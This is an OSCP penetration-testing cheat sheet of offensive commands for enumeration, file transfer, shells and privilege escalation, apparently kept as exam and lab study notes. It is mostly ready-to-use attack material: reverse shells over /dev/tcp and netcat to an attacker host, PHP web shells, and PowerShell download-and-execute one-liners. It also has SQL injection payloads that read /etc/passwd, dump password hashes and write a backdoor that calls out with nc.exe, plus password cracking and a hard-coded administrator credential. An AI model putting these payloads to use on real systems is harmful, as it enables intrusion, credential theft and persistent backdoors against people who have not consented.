# OSCP-Cheat-Sheet
Just Try Harder...
Perfect Practice Makes Perfect

## Reconnaissance and Enumeration
### Full TCP Scan
```
nmap -sC -sV -p- $RHOST | tee nmap$RHOST
```
### Top 1000 UDP Ports
```
sudo nmap -sU --top-ports 1000 $RHOST
```

### FTP - 21 TCP
```
ftp $RHOST
nc -vn $RHOST 21
```
Check for anonymous login
Brute force login:
```
hydra -s $RPORT -C ./SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f $RHOST ftp
```
https://book.hacktricks.xyz/pentesting/pentesting-ftp
https://steflan-security.com/?p=2075


### SMTP - 25 TCP
Might be able to enumerate usernames through SMTP.
```
nc $RHOST 25
[...]
VRFY root
VRFY jake
```

### DNS - 53 TCP/UDP
If port 53 is on TCP -> check for Zone Transfer
```
host -l <domain name> <name server>
dig axfr <domain name> @<name server>
eg: dig axfr friendzone.red @10.10.10.123
```

### RPC/NFS - 111
Enumerate RPC first:
```
nmap -sV -p 111 --script=rpcinfo $RHOST
```
If found NFS-related services, enumerate those.
```
nmap -p 111 --script nfs* $RHOST
```
If NFS shares found, mount them and try to read/write or change permission by adding a new user with a certain UID.
```
mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt

groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

### SMB 139/445 TCP
Check for 'null-session' - anonymous login.
Check for potential vulnerablity (Eternal Blue)

Enumerate Hostname
```
nmblookup -A $RHOST
```

List Shares
```
smbmap -H $RHOST
smbmap -u anonymous -p anonymous -H $RHOST


smbclient -L \\\\$RHOST
nmap --script smb-enum-shares -p 139,445 $RHOST
```

Check Null Sessions
```
rpcclient -U "" -N $RHOST
-U "" :null session
-N    :no password
```

Connect to Shares
```
smbclient \\\\$RHOST\\<Sharename>
```
Connect to Share with credentials
```
smbclient \\\\$RHOST\\<Sharename> -U=username%'password'
```

Can attempt to connect with blank password

Overall Scan
```
enum4linux -a $RHOST
```
https://book.hacktricks.xyz/pentesting/pentesting-smb


### SNMP - 161/UDP
```
snmp-check $RHOST
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $RHOST
snmpwalk -v1 -c public $RHOST
```
https://book.hacktricks.xyz/pentesting/pentesting-snmp


### HTTP directory brute force with Gobuster
```
gobuster dir -w ./SecLists/Discovery/Web-Content/raft-medium-words.txt -x <file extension> -u $RHOST
```
or with dirsearch
```
dirsearch -w ./SecLists/Discovery/Web-Content/raft-medium-words.txt -e <file extension> -u $RHOST
```
Common file extension for Linux: php,html,js,sh,txt,jsp,pl
Common file extension for Windows: php,asp,js,html,text,aspx,bak
-k can be added to bypass TLS

### DNS sub-domain brute force with Gobuster
```
gobuster vhost -w ./SecLists/Discovery/DNS/subdomains-top1million-10000.txt -u $HOSTNAME
```

### Nikto Scan
For easy wins or low-hanging fruit (less likely)
```
nikto -h $RHOST
```

### WordPress Enum with wpscan
```
wpscan --url $RHOST -e vt,tt,u,ap
```


## Shell Upgrading
```
python -c "import pty;pty.spawn('/bin/bash')"
^Z
stty echo -raw;fg
reset/enter
export TERM=xterm
```

## Transfer Files
### using Python http server
```
python3 -m http.server 8888
```
To get file:
```
curl $LHOST:8888/file -o outfile
wget $LHOST:8888/file
```
### Using netcat
```
nc -w 3 $RHOST 8888 < outfile
```
To get file
```
nc -lp 8888 > outfile
```
### Windows Powershell
```diff
- powershell (New-Object Net.WebClient).downloadString('$LHOST/file', 'outfile') <- download to disk: need double check
- powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')" <- download and exec on memory
```
### Certutil
```
certutil.exe -urlcache -split -f "$RHOST" outfile.zip
```

### From Windows to local Kali machine using impacket-smbserver
On local Kali machine:
```
sudo impacket-smbserver ShareName $(pwd)
```
Connect to newly created Share from Remote Windows target:
```
net use \\$LHOST\ShareName
```
Once connected to Share
```
copy $FILEPATH\file \\$LOST\ShareName
```
File should be copied from remote Windows target to local Kali machine at $(pwd)


## Simple PHP web shell
```
<?php system($_REQUEST['cmd']); ?>
xxx.php?cmd=whoami
```
or
```
<?php echo shell_exec($_REQUEST["cmd"]); ?>
```

## Reverse Shell
### PHP
```
<?php
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");
```

### Bash
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

### Netcat
```
nc $LHOST $LPORT -e /bin/bash
```

### Netcat Windows
```
nc.exe $LHOST $LPORT -e cmd.exe
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


## SQL Injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```diff
- WIP
```

Check number of column:
When SQLi is possible, if n+1 does not return anything, n is the number of column in the table
```
php?xxx=1 order by n
```


Dump MySQL DB:
```
mysqldump -u username -p DBname > dump.sql
```

Check for maths operation:
```
php?xxx=1 + 1
```

### Union SQL attack:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based
```
php?xxx=9999999 union select 1,2,3,4,5,n
```
With n is the correct column amount, the page should populate results again, database() and user() can be replaced to reveal information about the database.

Use group_concat() to display output of user(), database() and @@version in 1 line separate by “::”
```
php?xxx=9999999 union select 1,group_concat(user(),”::”,database(),”::”,@@version),3,4,5
```

Show database version with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,@@version
```

Show all tables in database with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables
```

Show all columns from the table “users” in the database with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,column_name from information_schema.columns where table_name=’users’
```

Use load_file() function to cat a file through SQLi:
```
php?xxx=9999999 union select 1,load_file(‘/etc/passwd’),3,4,5
```

Use into OUTFILE to write to a file with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
This writes a php backdoor into the web server root directory, from then we can achieve code exec with:
```
http://192.168.160.10/backdoor.php?cmd=nc.exe 192.168.119.160 8888 -e cmd.exe
```

Show hostname, user, hashed password of a database from union SQLi:
```
php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
```


## Post Exploitation
Check for current running processes:
```
ps aux
```
Check for current network connections:
```
ss -lntp
```
Check for interesting files:
ssh keys, logs file (if got permission), /etc/passwd, /opt, cronjob




## Some notes:

Some file extensions that can potentially bypass extension check:
PHP: phtml, php3, php4, php5, .inc
ASP: aspx
PERL: pl, .cgi, .lib
JSP: jspx, jsw, jsv, jspf

Find all SUID files:
```
find / -perm /4000 -exec ls -l {} \; 2>/dev/null
```
Find all files owned by an user:
```
find / -username -exec ls -l {} \; 2>/dev/null
```

### Hashcat:
Use hashcat rule to generate a list of variation of a common word:
```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout phrase.txt > variation.txt
```
To crack:
```
hashcat -m (mode) -a 0 hashdump plaintext
```
```
hashcat -m hash.txt rockyou.txt
```
### Decrypt encrypted SSH Key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
```
Crack with john using ssh2john.py module:
```
python ssh2john.py ssh.key > key.key
```
Then use john to brute force the SSH key phrase: (requires john 1.9 Jumbo)
```
john --wordlist=rockyou.txt key.key
```

### Decrypt a .kdbx (KeePass file)
Crack with keepass2john.py module
```
python keypass2john.py ceh.kdbx > hash.txt
```
Then use john to brute force the Hash: (requires john 1.9 Jumbo)
```
john --wordlist=rockyou.txt hash.txt
```


### Spoof a file signature
Spoof a php file with a png image
Grab PNG magic bytes (first 64 bytes)
```
head -c 64 image.png > sig
```
Create new PHP file with PNG signature
```
cat sig shell.php > newshell.php
```
Upload and modify POST request with Burp


## Pivoting
https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html
https://github.com/21y4d/Notes/blob/master/Pivoting.txt
 
## Breaking out of a Restricted Shell:
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf


## Linux Privilege Escalation/Post Exploitation
```diff
- WIP
```
Check for hidden files

Check for current Environment Variables

Check for unprotected SSH private key, or can we add our public key to authorized_keys

Check ```sudo -l``` for things that can be run privileges, with or without password

Look for any suspicious files in common places (```/home``` or ```/var/www/html```)

Check ```id```

Auto enumerate with ```linPEAS.sh```

Check current running processes that are owned by root with: ```ps aux | grep root```

Check if we're inside a Docker container, to break out out of a Docker container:
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

Check for services running/listening locally ```ss -lntp```

Check for cronjobs and cronjob logs:
Member of (adm) group can read log files
  Cron logs are stored at: /var/log/cron.log*
  Cronjob entries are stored at: /var/log/syslog

Check for unusual SUID binaries, investigate further with: https://gtfobins.github.io/
Run ```strace``` ```ltrace``` for detailed analysis of the binaries
Unpack with Ghidra

Check for installed applications, their versions, any known exploits?

With any fishy or suspicious running services, Google for potential priv-es vectors

Check for any root owned files that are writable

Check for history files (.bash_history, php_history...)
Check if /etc/passwd, .bashrc are writable

Check for writable libraries for potential library import hijack (eg: in Python, import os, check if os library is writable)

Check for file path (relative vs absolute path) --> potential path hijack

Check for config files (.conf), potential database password in .conf files, writable .conf files?

If tmux is installed, check for any shell session that we can hijack
```
tmux ls; tmux attach -t tmuxname; screen -ls; screen-dr sessionname; byobu list-session;
```

If NFS is open, check for NFS shares and mount them
```
showmount -e $RHOST; mount $RHOST:/ /tmp/
```

Last resort: Kernel Exploit! Check with linPEAS output or ```uname -a```

https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
https://github.com/sagishahar/lpeworkshop
https://in.security/lin-security-walkthrough/
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://steflan-security.com/?p=283
https://book.hacktricks.xyz/linux-unix/privilege-escalation


## Windows Privilege Escaltion/Post Exploitation
```diff
-WIP
```
Check permission with ```whoami /all```

Check general host information with ```systeminfo; net users; netstat -ano; ipconfig /all; tasklist```



Auto enumerate with ```winPEAS.exe```

Check loaded libraries --> potential DLL hijacking

Execute command remotely on Windows via SMB Creds with winexe or psexec.py
```
winexe -U 'user%password' //$RHOST powershell.exe
winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
```

https://github.com/M4ximuss/Powerless
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation

WinPEAS.exe

https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
https://github.com/sagishahar/lpeworkshop
https://github.com/411Hall/JAWS
https://steflan-security.com/?p=474
http://www.fuzzysecurity.com/tutorials/16.html

